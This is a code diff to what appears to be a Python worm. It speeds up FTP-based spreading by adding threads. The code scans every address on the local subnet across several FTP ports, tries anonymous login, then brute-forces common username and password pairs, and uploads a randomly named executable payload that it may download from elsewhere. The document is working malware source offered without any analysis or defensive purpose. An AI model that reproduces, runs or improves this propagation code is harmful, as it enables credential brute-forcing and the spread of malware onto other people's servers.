@@ -10,6 +10,7 @@ import urllib3
 import ftplib
 import ctypes
 import getpass
+from concurrent.futures import ThreadPoolExecutor
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -61,46 +62,49 @@ def download_payload():
     except:
         return None
 
-def ftp_connect(ip, user, pwd, anonymous=False):
+def ftp_connect(ip, user, pwd, p, anonymous=False):
     global PAYLOAD_PATH
     try:
         ftp = ftplib.FTP(timeout=2)
-        ports = [21]
-        ports.extend([2222,2021])
-        ports.extend(range(2121,2131))
-        for p in ports:
-            try:
-                ftp.connect(ip, port=p)
-                if anonymous: ftp.login()
-                else: ftp.login(user, pwd)
-                random_name = f'{generate_random_name()}.exe'
-                if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
-                else: payload_path = download_payload()
-                if payload_path:
-                    with open(payload_path, 'rb') as f:
-                        response = ftp.storbinary(f'STOR {random_name}', f)
-                        if response != "226 Transfer complete.": return False
-                else: return False
-                ftp.quit()
-                return True
-            except: continue
-        return False
+        ftp.connect(ip, port=p)
+        if anonymous: ftp.login()
+        else: ftp.login(user, pwd)
+        random_name = f'{generate_random_name()}.exe'
+        if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
+        else: payload_path = download_payload()
+        if payload_path:
+            with open(payload_path, 'rb') as f:
+                response = ftp.storbinary(f'STOR {random_name}', f)
+                if response != "226 Transfer complete.": return False
+        else: return False
+        ftp.quit()
+        return True
     except: return False
 
 # FTP propagation to subnet servers
 def ftp_spread(common_users, common_pass):
     try:
+        credentials = [(user, pwd) for user in common_users for pwd in common_pass]
         local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
-        for i in range(1, 255):
-            ip = f'{local_ip}.{i}'
-            if not ftp_connect(ip, "", "", anonymous=True):
-                done = False
-                for user in common_users:
-                    if done: break
-                    for pwd in common_pass:
-                        done = ftp_connect(ip, user, pwd)
-                        if done: 
-                            break 
+        def try_ip(ip):
+            ports = [21]
+            ports.extend([2222,2021])
+            ports.extend(list(range(2121,2131)))
+            for port in ports:
+                try:
+                    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    soc.settimeout(2)
+                    soc.connect((ip, port))
+                    soc.close()
+                    if not ftp_connect(ip, "", "", port, anonymous=True):
+                        done = False
+                        for user, pwd in credentials:
+                            done = ftp_connect(ip, user, pwd, port)
+                            if done: break 
+                except: continue
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            ip_list = [f'{local_ip}.{i}' for i in range(1, 255)]
+            executor.map(try_ip, ip_list)
     except:
         pass
 
